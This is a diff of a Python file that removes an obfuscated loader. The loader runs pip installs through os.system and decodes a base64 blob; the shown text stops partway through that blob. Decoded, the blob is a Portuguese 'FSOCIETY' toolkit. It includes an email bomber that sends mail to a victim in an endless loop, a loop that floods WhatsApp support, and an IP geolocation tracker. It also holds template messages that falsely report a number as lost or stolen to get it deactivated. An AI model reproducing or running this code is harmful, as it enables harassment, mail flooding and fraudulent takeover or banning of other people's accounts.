@@ -1,8 +1,417 @@
-import marshal, os
-try:
-	import lib, base64
-except:
-	os.system('pip install lib');os.system('pip install base64');os.system('pip install requests');os.system('python3 -m pip install --upgrade pip ');os.system('pip install requests');os.system('pip install pyfiglet')
+#####################
+# FUNÇÕES & MODULOS #
+#####################
 
-xvideo = (base64.b64decode('''IyMjIyMjIyMjIyMjIyMjIyMjIyMjCiMgRlVOw4fDlUVTICYgTU9EVUxPUyAjCiMjIyMjIyMjIyMjIyMjIyMjIyMjIwoKZ2xvYmFsIFIsQixDLFksRyxSVCxDWSxDTwpDTz0nXDAzM1ttJztSPSdcMDMzWzE7MzFtJztCPSdcMDMzWzE7MzRtJztDPSdcMDMzWzE7MzdtJztDWT0nXDAzM1sxOzM2bSc7WT0nXDAzM1sxOzMzbSc7Rz0nXDAzM1sxOzMybSc7UlQ9J1wwMzNbOzBtJztOT19GT1JNQVQ9IlwwMzNbMG0iO0NfR1JFWTg5PSJcMDMzWzM4OzU7MjU0bSI7Q19SRUQxPSJcMDMzWzQ4OzU7MTk2bSIKCgppbXBvcnQgb3MsIHN5cywgc210cGxpYiwganNvbiwgcmVxdWVzdHMKZnJvbSB0aW1lIGltcG9ydCBzbGVlcAoKdHJ5OgoJaW1wb3J0IHB5ZmlnbGV0CmV4Y2VwdDoKCW9zLnN5c3RlbSgncGlwIGluc3RhbGwgcHlmaWdsZXQnKQpkZWYgY2xlYXIoKToKCW9zLnN5c3RlbSgnY2xlYXInKQpkZWYgeCgpOgoJcHJpbnQoZicgICB7Q31be0d9WHtDfV17Un0gUkVUT1JOQVInKQkKCQojIyMjIyMjIyMjIyMjIyMjIyMjIwojICAgICAgICAgICAgICAgICAgIwojICBNRU5VIFBSSU5DSVBBTCAgIyAgICAgICAgICAKIyAgICAgICAgICAgICAgICAgICMKIyMjIyMjIyMjIyMjIyMjIyMjIyMKCgp3aGlsZSBUcnVlOgoJY2xlYXIoKQoJcHJpbnQoZicgICAge0d94oCU4oCU4oCUIHtDfVt7Un0qe0N9XSBDT0RJRklDQURPIFBPUjoge0d9TElQRVpJTntDfSBhbmQge0d9U3dlZXR7Q30gW3tSfSp7Q31de0d9IOKAlOKAlOKAlCcpCglyZXN1bHQgPSBweWZpZ2xldC5maWdsZXRfZm9ybWF0KCIgTUVOVSIsIGZvbnQgPSAiNWxpbmVvYmxpcXVlIiApCgoJcHJpbnQoZicnJ3tDfXtHfXtyZXN1bHR9JycnKQoJcHJpbnQoZicgICAgICAgICAgICAgIHtDfU7Dk1MgU09NT1MgQSB7Un1GU09DSUVUWXtDfScpCglwcmludChmJyAgIC8vLS09PS0tPT0tLT09LS09PS0tPT0tLT09LS09PS0tPT0tLT09LS09PS0tXFwnKQoJcHJpbnQoZicgICAxMSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMTEnKQoJcHJpbnQoZicgICAxMSB7Q31be0d9MDF7Q31de1J9IENPTlNVTFRBIElQIHtDfVt7R31PTntDfV17Q30gICAgICAgICAgICAgICAgICAgMTEnKQoJcHJpbnQoZicgICAxMSB7Q31be0d9MDJ7Q31de1J9IENPTlNVTFRBIE5PTUV7Q30gW3tHfU9Oe0N9XSAgICAgICAgICAgICAgICAgMTEnKQoJcHJpbnQoZicgICAxMSB7Q31be0d9MDN7Q31de1J9IFRFWFRPUyBTVVBPUlRFICAge0N9ICAgICAgICAgICAgICAgICAgMTEnKQoJcHJpbnQoZicgICAxMSB7Q31be0d9MDR7Q31de1J9IE5NQVAgICAgICAgICAgIHtDfSAgICAgICAgICAgICAgICAgICAgMTEnKQoJcHJpbnQoZicgICAxMSB7Q31be0d9MDV7Q31de1J9ICAgICAgICAgICAgICAgICAgICBPRkYge0N9ICAgICAgICAgICAgMTEnKQoJcHJpbnQoZicgICAxMSB7Q31be0d9MDZ7Q31de1J9IFBBQ0tzIChQUkVTRU5URVMpICAgICAgICB7Q30gICAgICAgICAgMTEnKQoJcHJpbnQoZicgICAxMSB7Q31be0d9MDd7Q31de1J9IEVNQUlMIEJPTUJFUiAgICAgICAgICAgICB7Q30gICAgICAgICAgMTEnKQoJcHJpbnQoZicgICAxMSB7Q31be0d9MDh7Q31de1J9IFJFU0VUQVIgVEVNUE8gRE8gQ09EICAgIHtDfSAgICAgICAgICAgMTEnKQoJcHJpbnQoZicgICAxMSB7Q31be0d9MDl7Q31de1J9IFRJUkFSIE7Dmk1FUk8gRE8gQkFOICAgICAge0N9ICAgICAgICAgIDExJykKCXByaW50KGYnICAgMTEge0N9W3tHfTEwe0N9XXtSfSBwaG9uZWluZm9nYSBvZmYgICAgICAgICAgICAge0N9ICAgICAgICAgIDExJykKCXByaW50KGYnICAgMTEge0N9W3tHfTExe0N9XXtSfSBNT1NUUkFSIE1FVSBJUCAgICAgICAgICAge0N9ICAgICAgICAgIDExJykKCXByaW50KGYnICAgMTEge0N9W3tHfTEye0N9XXtSfSBDT05TVUxUQSBDTlBKe0N9IFt7R31PTntDfV0gICAgICAge0N9ICAgICAgICAgIDExJykKCXByaW50KGYnICAgMTEgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDExJykKCXByaW50KGYnICAgXFwtLT09LS09PS0tPT0tLT09LS09PS0tPT0tLT09LS09PS0tPT0tLT09LS0vLycpCglwcmludChmJyAgIC8vICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcXDEnKQoJcHJpbnQoZicgICAxMSB7Q31be0d9TlVNe0N9XXtSfSBOw5pNRVJPIERPUyBDUklBRE9SRVMgICAgICAge0N9ICAgICAgIDExJykKCXByaW50KGYnICAgMTEge0N9W3tHfUZTT3tDfV17Un0gcmFzdHJlYXIgbnVtZXJvICAgICB7Q30gICAgICAgMTEnKQoJcHJpbnQoZicgICAxMSB7Q31be0d9RVhJVHtDfV17Un0gRU5DRVJSQVIgQSBGRVJSQU1FTlRBICB7Q30gICAgICAgICAgMTEnKQoJcHJpbnQoZicgICAxMSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMTEnKQoJcHJpbnQoZicgICBcXC0tPT0tLT09LS09PS0tPT0tLT09LS09PS0tPT0tLT09LS09PS0tPT0tLS8vJykKCWNob2ljZSA9IGlucHV0KGYnXG5cblxue1J9ICAgPj4+e0N9ICcpCgkKCQoJaWYgY2hvaWNlID09ICc0JzoKCQkgICAgICAgIG9zLnN5c3RlbSgnZ2l0IGNsb25lIGh0dHBzOi8vZ2l0aHViLmNvbS9ubWFwL25tYXAnKQoJCSAgICAgICAgCgkJIAoJCQoJCgkKIyMjIyMjIyMjIyMjIyMjIyMjIwojIE9QQ0FPIDEyIC0gQ05QSiAjCQojIyMjIyMjIyMjIyMjIyMjIyMjCglpZiBjaG9pY2UgPT0gJzEyJzoKCQkJCSM1OTI5MTUzNDAwMDE2NwoJCQkJd2hpbGUgVHJ1ZToKCQkJCQljbGVhcigpCgkJCQkJcmVzdWx0ID0gcHlmaWdsZXQuZmlnbGV0X2Zvcm1hdCgiIENPTlNVTFRBXG4gICAgIENOUEoiLCBmb250ID0gInNsYW50IiApCgkJCQkJcHJpbnQoZicnJ3tDfXtHfQoJCQkJCXtyZXN1bHR9JycnKQoJCQkJCXgoKQoJCQkJCXByaW50KGYnICAgICAgICAgICAgICB7Q31Ow5NTIFNPTU9TIEEge1J9RlNPQ0lFVFl7Q30nKQoJCQkJCXByaW50KGYnICAge0N9XFwtLT09LS09PS0tPT0tLT09LS09PS0tPT0tLT09LS09PS0tPT0tLT09LS0vLycpCgkJCQkJY25wal9hbHZvID0gaW5wdXQoZid7R30gICAgICAgRElHSVRFIE8gQ05QSntSfSA+Pj57Q30gJykKCQkJCQlpZiBjbnBqX2Fsdm8gPT0gJ1gnOgoJCQkJCQlicmVhawoJCQkJCXByaW50KGYnICAge0N9Ly8tLT09LS09PS0tPT0tLT09LS09PS0tPT0tLT09LS09PS0tPT0tLT09LS1cXCcpCgkJCQkJY25wal9kYXRhID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL3d3dy5yZWNlaXRhd3MuY29tLmJyL3YxL2NucGove30nLmZvcm1hdChjbnBqX2Fsdm8pKS5qc29uKCkKCQkJCQlwcmludChmJ1xuXG4gICAgICAgICAgIHtHfSAgICAgICBEQURPUyBBQkFJWE8nKQoJCQkJCXByaW50KGYnICAge0N9Ly8tLT09LS09PS0tPT0tLT09LS09PS0tPT0tLT09LS09PS0tPT0tLT09LS1cXCBcbicpCgkJCQkJcHJpbnQoY25wal9kYXRhKQoJCQkJCXByaW50KGYnXG5cbiAgIHtDfVt7Un0qe0N9XSBQUkVTU0lPTkUge0d9RU5URVJ7Q30gUEFSQSBSRUFMSVpBUiBVTUEgTk9WQSBDT05TVUxUQS4nKQoJCQkJCWNucGpfbWVudSA9IGlucHV0KGYnXG57Un0gICA+Pj57Q30gJykKCQkJCQlpZiBjbnBqX21lbnUgPT0gJ1gnOgoJCQkJCQlicmVhawoJCgoJCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwojIE9QQyAxMSAtIE1PU1RSQVIgTUVVIElQICMKIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCQoJCglpZiBjaG9pY2UgPT0gJzExJzoKCQkJY2xlYXIoKQoJCQlwcmludChmJ1xuXG4gICAgICAgICAgICAgICB7R31EQURPUyBETyBTRVUgSVAgQVRVQUw6ICcpCgkJCXByaW50KGYnICAge0N9XFwtLT09LS09PS0tPT0tLT09LS09PS0tPT0tLT09LS09PS0tPT0tLT09LS0vLycpCgkJCXByaW50KGYne0N9ICAgW3tSfSp7Q31dIHBvZGUgc2VyIHVzYWRvIHBhcmEgdGVzdGFyIFZQTnMhJykKCQkJaXBfY2ggPSByZXF1ZXN0cy5nZXQoJ2h0dHA6Ly9pcC1hcGkuY29tL2pzb24vJykKCQkJaXBfY2ggPSBpcF9jaC5qc29uKCkKCQkJc3RhdHVzID0gaXBfY2hbInN0YXR1cyJdCgkJCWNvdW50cnkgPSBpcF9jaFsiY291bnRyeSJdCgkJCWNvdW50cnlDb2RlID0gaXBfY2hbImNvdW50cnlDb2RlIl0KCQkJcmVnaW9uID0gaXBfY2hbInJlZ2lvbiJdCgkJCXJlZ2lvbk5hbWUgPSBpcF9jaFsicmVnaW9uTmFtZSJdCgkJCWNpdHkgPSBpcF9jaFsiY2l0eSJdCgkJCXppcCA9IGlwX2NoWyJ6aXAiXQoJCQlsYXQgPSBpcF9jaFsibGF0Il0KCQkJbG9uID0gaXBfY2hbImxvbiJdCgkJCXRpbWV6b25lID0gaXBfY2hbInRpbWV6b25lIl0KCQkJaXNwID0gaXBfY2hbImlzcCJdCgkJCW9yZyA9IGlwX2NoWyJvcmciXQoJCQlBUyA9IGlwX2NoWyJhcyJdCgkJCXF1ZXJ5ID0gaXBfY2hbInF1ZXJ5Il0KCQkJcHJpbnQoJ1xuJykKCQkJcHJpbnQoZid7R30gICBTVEFUVVM6e0N9Jywgc3RhdHVzKQoJCQlwcmludChmJ3tHfSAgIENPVU5UUlk6e0N9JywgY291bnRyeSkKCQkJcHJpbnQoZid7R30gICBDT1VOVFJZQ09ERTp7Q30nLCBjb3VudHJ5Q29kZSkKCQkJcHJpbnQoZid7R30gICBSRUdJT046e0N9JywgcmVnaW9uKQoJCQlwcmludChmJ3tHfSAgIFJFR0lPTiBOQU1FOntDfScsIHJlZ2lvbk5hbWUpCgkJCXByaW50KGYne0d9ICAgQ0lUWTp7Q30nLCBjaXR5KQoJCQlwcmludChmJ3tHfSAgIFpJUDp7Q30nLCB6aXApCgkJCXByaW50KGYne0d9ICAgTEFUOntDfScsIGxhdCkKCQkJcHJpbnQoZid7R30gICBMT046e0N9JywgbG9uKQoJCQlwcmludChmJ3tHfSAgIFRJTUVaT05FOntDfScsIHRpbWV6b25lKQoJCQlwcmludChmJ3tHfSAgIElTUDp7Q30nLCBpc3ApCgkJCXByaW50KGYne0d9ICAgT1JHOntDfScsIG9yZykKCQkJcHJpbnQoZid7R30gICBBUzp7Q30nLCBBUykKCQkJcHJpbnQoZid7R30gICBRVUVSWTp7Q30nLCBxdWVyeSkKCgkJCXByaW50KGYnXG4gICB7Q31be1J9KntDfV0gUFJFU1NJT05FIHtHfUVOVEVSe0N9IFBBUkEgUkVUT1JOQVIgQU8gTUVOVS4nKQoJCQlpcHRyYWNrID0gaW5wdXQoZidcblxue1J9ICAgPj4+e0N9ICcpCgkJCQoJCQkKCgkKCQojIyMjIyMjIyMjIyMjIyMjIyMjIyMjCiMgSVAgVFJBQ0tFUiAtIE9QQyAxICMKIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwoJCglpZiBjaG9pY2UgPT0gJzEnOgoJCXdoaWxlIFRydWU6CgkJCWNsZWFyKCkKCQkJcmVzdWx0ID0gcHlmaWdsZXQuZmlnbGV0X2Zvcm1hdCgiSVAgVFJBQ0tFUiIsIGZvbnQgPSAic2xhbnQiICkKCQkJcHJpbnQoZicnJ3tDfXtHfXtyZXN1bHR9JycnKQoJCQlwcmludChmJyAgICAgICAgICAgICAge0N9TsOTUyBTT01PUyBBIHtSfUZTT0NJRVRZe0N9JykKCQkJcHJpbnQoZicgICB7Q31cXC0tPT0tLT09LS09PS0tPT0tLT09LS09PS0tPT0tLT09LS09PS0tPT0tLS8vJykKCQkJCgkJCXgoKQoJCQlpcHZpdG1hID0gaW5wdXQoZidcbntHfSAgIElQIFRBUkdFVHtSfSA+Pj57Q30gJykKCQkJaWYgaXB2aXRtYSA9PSAnWCc6CgkJCQlicmVhawoJCQlwcmludChmJ1xuXG5cbiAgICAgICAgICAgICAgICAge0d9IExJU1RBIERPUyBEQURPUzogJykKCQkJcHJpbnQoZicgICB7Q31cXC0tPT0tLT09LS09PS0tPT0tLT09LS09PS0tPT0tLT09LS09PS0tPT0tLS8vJykKCQkJaXBfY2ggPSByZXF1ZXN0cy5nZXQoJ2h0dHA6Ly9pcC1hcGkuY29tL2pzb24ve30nLmZvcm1hdChpcHZpdG1hKSkKCQkJaXBfY2ggPSBpcF9jaC5qc29uKCkKCQkJc3RhdHVzID0gaXBfY2hbInN0YXR1cyJdCgkJCWNvdW50cnkgPSBpcF9jaFsiY291bnRyeSJdCgkJCWNvdW50cnlDb2RlID0gaXBfY2hbImNvdW50cnlDb2RlIl0KCQkJcmVnaW9uID0gaXBfY2hbInJlZ2lvbiJdCgkJCXJlZ2lvbk5hbWUgPSBpcF9jaFsicmVnaW9uTmFtZSJdCgkJCWNpdHkgPSBpcF9jaFsiY2l0eSJdCgkJCXppcCA9IGlwX2NoWyJ6aXAiXQoJCQlsYXQgPSBpcF9jaFsibGF0Il0KCQkJbG9uID0gaXBfY2hbImxvbiJdCgkJCXRpbWV6b25lID0gaXBfY2hbInRpbWV6b25lIl0KCQkJaXNwID0gaXBfY2hbImlzcCJdCgkJCW9yZyA9IGlwX2NoWyJvcmciXQoJCQlBUyA9IGlwX2NoWyJhcyJdCgkJCXF1ZXJ5ID0gaXBfY2hbInF1ZXJ5Il0KCQkJcHJpbnQoJ1xuJykKCQkJcHJpbnQoZid7R30gICBTVEFUVVM6e0N9Jywgc3RhdHVzKQoJCQlwcmludChmJ3tHfSAgIENPVU5UUlk6e0N9JywgY291bnRyeSkKCQkJcHJpbnQoZid7R30gICBDT1VOVFJZQ09ERTp7Q30nLCBjb3VudHJ5Q29kZSkKCQkJcHJpbnQoZid7R30gICBSRUdJT046e0N9JywgcmVnaW9uKQoJCQlwcmludChmJ3tHfSAgIFJFR0lPTiBOQU1FOntDfScsIHJlZ2lvbk5hbWUpCgkJCXByaW50KGYne0d9ICAgQ0lUWTp7Q30nLCBjaXR5KQoJCQlwcmludChmJ3tHfSAgIFpJUDp7Q30nLCB6aXApCgkJCXByaW50KGYne0d9ICAgTEFUOntDfScsIGxhdCkKCQkJcHJpbnQoZid7R30gICBMT046e0N9JywgbG9uKQoJCQlwcmludChmJ3tHfSAgIFRJTUVaT05FOntDfScsIHRpbWV6b25lKQoJCQlwcmludChmJ3tHfSAgIElTUDp7Q30nLCBpc3ApCgkJCXByaW50KGYne0d9ICAgT1JHOntDfScsIG9yZykKCQkJcHJpbnQoZid7R30gICBBUzp7Q30nLCBBUykKCQkJcHJpbnQoZid7R30gICBRVUVSWTp7Q30nLCBxdWVyeSkKCgkJCXByaW50KGYnXG4gICB7Q31be1J9KntDfV0gUFJFU1NJT05FIHtHfUVOVEVSe0N9IFBBUkEgUkVBTElaQVIgVU1BIE5PVkEgQ09OU1VMVEEuJykKCQkJaXB0cmFjayA9IGlucHV0KGYnXG5cbntSfSAgID4+PntDfSAnKQoJCQlpZiBpcHRyYWNrID09ICdYJzoKCQkJCWJyZWFrCgojIyMjIyMjIyMjIyMjIyMjIyMjIyMjCiMgUkVTRVRBUiBDT0QgRE8gWkFQICMKIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwoJCglpZiBjaG9pY2UgPT0gJzgnOgoJCXdoaWxlIFRydWU6CgkJCWNsZWFyKCkKCQkJcmVzdWx0ID0gcHlmaWdsZXQuZmlnbGV0X2Zvcm1hdCgiUkVTRVRBIENPRCIsIGZvbnQgPSAic2xhbnQiICkKCQkJcHJpbnQoZicnJ3tDfXtHfXtyZXN1bHR9JycnKQoJCQlwcmludChmJyAgICAgICAgICAgICAge0N9TsOTUyBTT01PUyBBIHtSfUZTT0NJRVRZe0N9JykKCQkJcHJpbnQoZicgICAtLT09LS09PS0tPT0tLT09LS09PS0tPT0tLT09LS09PS0tPT0tLT09LS1cbicpCgkJCXByaW50KGYnICAge0N9W3tHfU9CU3tDfV0gbsOzcyBuw6NvIHRlcmVtb3MgYWNlc3NvIGEgc2VuaGEgZGUgc2V1IGVtYWlsIVxuICAgICAgICAgbyBjw7NkaWdvIGVzdMOhIGFiZXJ0byBwYXJhIGNvbXByb3ZhciBpc3NvLicpCgkJCXgoKQoJCQllbWFpbCA9IGlucHV0KGYne0d9ICAgU0VVIEVNQUlMOntDfSAnKQoJCQlpZiBlbWFpbCA9PSAnWCc6CgkJCQlicmVhawoJCQlzZW5kZXJfZW1haWwgPSAie30iLmZvcm1hdChlbWFpbCkKCQkJcmVjX2VtYWlsID0gInN1cHBvcnRAd2hhdHNhcHAuY29tIgoJCQlwYXNzd29yZCA9IGlucHV0KHN0cihmIiAgIHtHfURJR0lURSBBIFNFTkhBOntDfSAiKSkKCQkJaWYgcGFzc3dvcmQgPT0gJ1gnOgoJCQkJYnJlYWsKCQkJbnVtYmVyID0gaW5wdXQoZid7R30gICBESUdJVEUgU0VVIE7Dmk1FUk8gKEVYOiArNTUgNTEgOSoqKiotKioqKik6e0N9ICcpCgkJCWlmIG1zZ2YgPT0gJ1gnOgoJCQkJYnJlYWsKCQkJc3ViamVjdCA9ICJ0aXR1bG8iCgkJCW1lc3NhZ2UgPSAib2kiCgkJCXNlcnZlciA9IHNtdHBsaWIuU01UUCgnc210cC5nbWFpbC5jb20nLCA1ODcpCgkJCXNlcnZlci5zdGFydHRscygpCgkJCXNlcnZlci5sb2dpbihzZW5kZXJfZW1haWwsIHBhc3N3b3JkKQoJCQlwcmludChmIntDfSAgIFt7Un0qe0N9XXtHfSBMT0dJTiBFRkVUVUFETyEiKQoJCQl3aGlsZSBUcnVlOgoJCQkJc2VydmVyLnNlbmRtYWlsKHNlbmRlcl9lbWFpbCwgcmVjX2VtYWlsLCBtZXNzYWdlKQoJCQkJcHJpbnQoZiJ7R31PIEVNQUlMIEZPSSBFTlZJQURPIENPTSBTVUNFU1NPISBBTFZPOntSfSIsIHJlY19lbWFpbCkKCQkJCgkKCQoJIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwoJIyBFTUFJTEJPTUJFUiBQRVJTT05BTElaQVYgIwoJIyMjIyMjIyMjIyMjIyMjI+KEliMjIyMjIyMjIyMjCgkKCQoJCglpZiBjaG9pY2UgPT0gJzcnOgoJCXdoaWxlIFRydWU6CgkJCWNsZWFyKCkKCQkJcmVzdWx0ID0gcHlmaWdsZXQuZmlnbGV0X2Zvcm1hdCgiZW1haWwgYm9tYmVyIiwgZm9udCA9ICJzbGFudCIgKQoJCQlwcmludChmJycne0N9e0d9e3Jlc3VsdH0nJycpCgkJCXByaW50KGYnICAgICAgICAgICAgICB7Q31Ow5NTIFNPTU9TIEEge1J9RlNPQ0lFVFl7Q30nKQoJCQlwcmludChmJyAgIC0tPT0tLT09LS09PS0tPT0tLT09LS09PS0tPT0tLT09LS09PS0tPT0tLVxuJykKCQkJcHJpbnQoZicgICB7Q31be0d9T0JTe0N9XSBuw7NzIG7Do28gdGVyZW1vcyBhY2Vzc28gYSBzZW5oYSBkZSBzZXUgZW1haWwhXG4gICAgICAgICBvIGPDs2RpZ28gZXN0w6EgYWJlcnRvIHBhcmEgY29tcHJvdmFyIGlzc28uJykKCQkJeCgpCgkJCWFsdm8gPSBpbnB1dChmJ1xuXG57R30gICBFTUFJTCBETyBBTFZPOntDfSAnKQoJCQlpZiBhbHZvID09ICdYJzoKCQkJCWJyZWFrCgkJCWVtYWlsID0gaW5wdXQoZid7R30gICBTRVUgRU1BSUw6e0N9ICcpCgkJCWlmIGVtYWlsID09ICdYJzoKCQkJCWJyZWFrCgkJCXNlbmRlcl9lbWFpbCA9ICJ7fSIuZm9ybWF0KGVtYWlsKQoJCQlyZWNfZW1haWwgPSAie30iLmZvcm1hdChhbHZvKQoJCQlwYXNzd29yZCA9IGlucHV0KHN0cihmIiAgIHtHfURJR0lURSBBIFNFTkhBOntDfSAiKSkKCQkJaWYgcGFzc3dvcmQgPT0gJ1gnOgoJCQkJYnJlYWsKCQkJbXNnZiA9IGlucHV0KGYne0d9ICAgTUVOU0FHRU0gUVVFIElSw4EgU0VSIEVOVklBREE6e0N9ICcpCgkJCWlmIG1zZ2YgPT0gJ1gnOgoJCQkJYnJlYWsKCQkJc3ViamVjdCA9ICJvaSIKCQkJbWVzc2FnZSA9ICJ7fSIuZm9ybWF0KG1zZ2YpCgkJCXNlcnZlciA9IHNtdHBsaWIuU01UUCgnc210cC5nbWFpbC5jb20nLCA1ODcpCgkJCXNlcnZlci5zdGFydHRscygpCgkJCXNlcnZlci5sb2dpbihzZW5kZXJfZW1haWwsIHBhc3N3b3JkKQoJCQlwcmludChmIntDfSAgIFt7Un0qe0N9XXtHfSBMT0dJTiBFRkVUVUFETyEiKQoJCQl3aGlsZSBUcnVlOgoJCQkJc2VydmVyLnNlbmRtYWlsKHNlbmRlcl9lbWFpbCwgcmVjX2VtYWlsLCBtZXNzYWdlKQoJCQkJcHJpbnQoZiJ7R31PIEVNQUlMIEZPSSBFTlZJQURPIENPTSBTVUNFU1NPISBBTFZPOntSfSIsIHJlY19lbWFpbCkKCQkJCgojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwojIE9Qw4fDg08gMyAtIFRFWFRPUyBTVVBPUlRFUyAjCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCgoKCWlmIGNob2ljZSA9PSAnMyc6CgkJd2hpbGUgVHJ1ZToKCQkJY2xlYXIoKQoJCQlyZXN1bHQgPSBweWZpZ2xldC5maWdsZXRfZm9ybWF0KCIgVEVYVE9TIiwgZm9udCA9ICJzbGFudCIgKQoJCQlwcmludChmJycne0N9e0d9CgkJCXtyZXN1bHR9JycnKQoJCQlwcmludChmJyAgICAgICAgICAgICAge0N9TsOTUyBTT01PUyBBIHtSfUZTT0NJRVRZe0N9JykKCQkJcHJpbnQoZidcblxue0N9ICAgLS09PS0tPT0tLT09LS09PS0tPT0tLVxuJykKCQkJcHJpbnQoZicgICB7Q31be0d9MDF7Q31de1J9IFRFWFRPIERFU0FUSVZBw4fDg08nKQoJCQlwcmludChmJyAgIHtDfVt7R30wMntDfV17Un0gVEVYVE9TIFRJUkFSIERPIEJBTicpCgkJCXByaW50KGYnICAge0N9W3tHfTAze0N9XXtSfSBURVhUT1MgUkVTRVRBUiBDT0QnKQoJCQlwcmludChmJ1xue0N9ICAgLS09PS0tPT0tLT09LS09PS0tPT0tLScpCgkJCXByaW50KGYnICAge0N9W3tHfVh7Q31de1J9IFJFVE9STkFSJykKCQkJY2hvaWNlX3R4dCA9IGlucHV0KGYnXG5cbntSfSAgID4+PntDfSAnKQoJCQlpZiBjaG9pY2VfdHh0ID09ICdYJzoKCQkJCWJyZWFrCgkJCQkKCQkJCSMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKCQkJCSMgT1DDh8ODTyAzIC0gUkVTRVRBUiBDT0QgIwoJCQkJIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwoJCQlpZiBjaG9pY2VfdHh0ID09ICczJzoKCQkJCXdoaWxlIFRydWU6CgkJCQkJY2xlYXIoKQoJCQkJCXByaW50KGYnICAgICAgICAgICAgICB7Q31Ow5NTIFNPTU9TIEEge1J9RlNPQ0lFVFl7Q30nKQoJCQkJCXByaW50KGYne0N9ICAgICAgICAgICAgIC0tPT0tLT09LS09PS0tPT0tLT09LS1cbicpCgkJCQkJcHJpbnQoZid7R30gICBBc3N1bnRvOiBOw6NvIGNvbnNpZ28gcmVjZWJlciBjw7NkaWdvIGRlIHZlcmlmaWNhw6fDo28gZG8gd2hhdHNhcHB7Q31cbk1ldSBuw7ptZXJvIChuw7ptZXJvKSBlc3TDoSBubyBzdXBvcnRlICxhbGd1w6ltIHNvbGljaXRvdSBvIGPDs2RpZ28gcG9yIGVuZ2Fuby4gTWV1IG7Dum1lcm8gdXNvIHBhcmEgdHJhYmFsaG8gdGVuaG8gdW1hIGVtcHJlc2EgZGUgZW1wcmVlbmRpbWVudG8gZSBwcmVjaXNvIGRlc3RhIGNvbnRhIHBvciBmYXZvciByZXRpcmVtIG1ldSBuw7ptZXJvLiBSZWluaWNpZW0gbWV1IGPDs2RpZ28gU01TJykKCQkJCQlwcmludChmJ1xue0N9ICAgICAgICAgICAgIC0tPT0tLT09LS09PS0tPT0tLT09LS1cbicpCgkJCQkJeCgpCgkJCQkJYmFuID0gaW5wdXQoZidcbiAgIHtSfT4+PntDfSAnKQoJCQkJCWlmIGJhbiA9PSAnWCc6CgkJCQkJCWJyZWFrCgkJCQkJCQoJCQkJCQkKCQkJIyMjIyMjIyMjIyPihJYjIyMjIyMjIyMjIyMjIyMJCgkJCSMgT1DDh8ODTyAyIC0gVFhUJ3MgU1VQT1JURSAjCgkJCSMjIyMjIyMjIyMjIyPihJYjIyMjIyMjIyMjIyMjCgkJCQoJCQlpZiBjaG9pY2VfdHh0ID09ICcyJzoKCQkJCXdoaWxlIFRydWU6CgkJCQkJY2xlYXIoKQoJCQkJCXByaW50KGYnICAgICAgICAgICAgICB7Q31Ow5NTIFNPTU9TIEEge1J9RlNPQ0lFVFl7Q30nKQoJCQkJCXByaW50KGYne0N9ICAgICAgICAgICAgIC0tPT0tLT09LS09PS0tPT0tLT09LS1cbicpCgkJCQkJcHJpbnQoZid7R30gICBBc3N1bnRvOiBNZXUgbnVtZXJvIG5vdm8gZm9pIGJhbmlkbyBzZW0gbmVuaHVtIG1vdGl2by5cbiAgIHtDfU1ldSBuw7ptZXJvIMOpIG5vdm8sZSBjb20gZWxlIGFicmkgcmVjZW50ZW1lbnRlIHVtYSBpbmTDunN0cmlhIGUgbmVzc2EgaW5kw7pzdHJpYSBuZWNlc3NpdG8gdXJnZW50ZW1lbnRlIGRhIG1pbmhhIGNvbnRhIG7Do28gZGVzcmVzcGVpdGVpIG5lbmh1bWEgcmVncmEgZGEgcG9sw610aWNhIGRlIHByaXZhY2lkYWRlLGxvZ28gcGXDp28gcXVlIGEgRXF1aXBlIGRlIHN1cG9ydGUgZG8gd2hhdHNhcHAgdG9tZSBwcm92aWTDqm5jaWFzIG8gbWFpcyByYXBpZG8gcG9zc2l2ZWwgcGFyYSBldSBwb2RlciB0ZXIgYWNlc3NvIGFvcyBtYXRlcmlhaXMgZGEgbWluaGEgaW5kw7pzdHJpYSBbbnVtZXJvXScpCgkJCQkJcHJpbnQoZidcbntDfSAgICAgICAgICAgICAtLT09LS09PS0tPT0tLT09LS09PS0tXG4nKQoJCQkJCXgoKQoJCQkJCWJhbiA9IGlucHV0KGYnXG4gICB7Un0+Pj57Q30gJykKCQkJCQlpZiBiYW4gPT0gJ1gnOgoJCQkJCQlicmVhawoJCQkJCQkKCQkJCQkJCgoJCQkJCQoJCQkJCgkJCQkJCQojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKIyBUWFQnUyBTVVBPUlRFIC0gMSBERVNBVElWQcOHw4NPICMJCSMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwoJCQkKCQkJCgkJCWlmIGNob2ljZV90eHQgPT0gJzEnOgoJCQkJd2hpbGUgVHJ1ZToKCQkJCQljbGVhcigpCgkJCQkJcHJpbnQoZicgICAgICAgICAgICAgIHtDfU7Dk1MgU09NT1MgQSB7Un1GU09DSUVUWXtDfScpCgkJCQkJcHJpbnQoZid7Q30gICAgICAgICAgICAgLS09PS0tPT0tLT09LS09PS0tPT0tLVxuJykKCQkJCQlwcmludChmJ1xuICAge0d9QXNzdW50bzpQZXJkaWRvL1JvdWJhZG9cbntDfSAgIE1ldSBuw7ptZXJvIGZvaSBwZXJkaWRvIGUgcm91YmFkbywgdGVyaWFtIGNvbW8gdm9jw6pzIGRlc2F0aXbDoS1sbz8gRWxlIGNvbnTDqm0gZGFkb3MgaW1wb3J0YXRlcyBOw7ptZXJvOlxuJykKCQkJCQlwcmludChmJ3tDfSAgICAgICAgICAgICAtLT09LS09PS0tPT0tLT09LS09PS0tXG4nKQoJCQkJCXByaW50KGYne0d9ICAgQXNzdW50bzogUGVyZGlkby9Sb3ViYWRve0N9XG4gICBQb3IgZmF2b3